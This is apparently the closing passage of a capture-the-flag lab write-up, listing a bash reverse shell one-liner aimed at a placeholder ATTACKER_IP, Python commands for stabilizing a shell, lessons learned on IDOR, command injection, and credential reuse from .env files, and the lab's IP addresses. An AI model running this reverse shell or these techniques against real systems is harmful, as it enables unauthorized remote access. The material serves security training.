**Reverse Shell (Bash):**
```bash
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
```

**Python Shell Stabilization:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lessons Learned

1. **Source code analysis** can reveal hidden endpoints missed by directory brute-forcing
2. **JavaScript files** often contain API endpoints and function names
3. **API enumeration** via dedicated endpoints (like `/api/v1`) is crucial
4. **IDOR vulnerabilities** in API update endpoints can lead to privilege escalation
5. **Command injection** in file generation/processing features is common
6. **Environment files** (`.env`) often contain reusable credentials
7. **Kernel vulnerabilities** should always be checked for recently patched systems

---

**Box Completed:** December 5, 2025  
**Your IP:** 10.10.14.56  
**Target IP:** 10.10.11.221  

---
